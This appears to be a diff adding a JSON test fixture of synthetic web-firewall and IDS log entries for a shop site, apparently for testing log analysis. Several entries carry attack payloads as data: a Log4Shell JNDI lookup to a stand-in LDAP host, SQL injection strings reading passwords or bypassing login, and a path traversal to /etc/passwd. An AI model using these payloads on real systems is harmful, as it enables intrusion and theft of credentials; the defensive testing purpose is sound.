@@ -1,0 +1,89 @@
+[
+  {
+    "timestamp": "2026-11-01T09:45:00+09:00",
+    "src_ip": "203.0.113.10",
+    "device_type": "WAF",
+    "evtname": "Log4Shell attempt",
+    "httpHost": "shop.example.test",
+    "url": "/api/products?item=1",
+    "requestMethod": "GET",
+    "headers": {"User-Agent": "${jndi:ldap://probe.example.test/a}"},
+    "disposition": "Block",
+    "resultCode": "403",
+    "attack_name": "Log4Shell attempt",
+    "alertSev": "critical",
+    "occurrences": "8"
+  },
+  {
+    "timestamp": "2026-11-01T10:02:00+09:00",
+    "src_ip": "203.0.113.10",
+    "device_type": "WAF",
+    "evtname": "SQL injection probe",
+    "httpHost": "shop.example.test",
+    "url": "/api/products",
+    "webQuery": "item=1 UNION SELECT password FROM users",
+    "requestMethod": "GET",
+    "disposition": "Permit",
+    "resultCode": "200",
+    "attack_name": "SQL injection probe",
+    "alertSev": "high",
+    "occurrences": "3"
+  },
+  {
+    "timestamp": "2026-11-01T10:03:00+09:00",
+    "src_ip": "198.51.100.24",
+    "device_type": "WAF",
+    "evtname": "SQL injection login probe",
+    "httpHost": "shop.example.test",
+    "url": "/admin/login",
+    "requestMethod": "POST",
+    "request_body": "username=admin' OR '1'='1&password=test",
+    "disposition": "Permit",
+    "resultCode": "401",
+    "attack_name": "SQL injection login probe",
+    "alertSev": "high"
+  },
+  {
+    "timestamp": "2026-11-01T10:20:00+09:00",
+    "src_ip": "198.51.100.24",
+    "device_type": "WAF",
+    "evtname": "Path traversal",
+    "httpHost": "shop.example.test",
+    "url": "/download?file=../../etc/passwd",
+    "requestMethod": "GET",
+    "disposition": "Block",
+    "resultCode": "403",
+    "attack_name": "Path traversal",
+    "alertSev": "medium"
+  },
+  {
+    "timestamp": "2026-11-01T10:35:00+09:00",
+    "src_ip": "192.0.2.44",
+    "device_type": "WAF",
+    "evtname": "Health check",
+    "httpHost": "shop.example.test",
+    "url": "/status",
+    "requestMethod": "GET",
+    "disposition": "Permit",
+    "resultCode": "200"
+  },
+  {
+    "timestamp": "2026-11-01T10:36:00+09:00",
+    "src_ip": "192.0.2.44",
+    "device_type": "WAF",
+    "evtname": "Page not found",
+    "httpHost": "shop.example.test",
+    "url": "/unknown-page",
+    "requestMethod": "GET",
+    "disposition": "Permit",
+    "resultCode": "404"
+  },
+  {
+    "timestamp": "2026-11-01T10:40:00+09:00",
+    "src_ip": "203.0.113.55",
+    "destination_ip": "192.0.2.70",
+    "device_type": "IDS",
+    "evtname": "Port Scan Detected",
+    "result_status": "Inconclusive"
+  }
+]
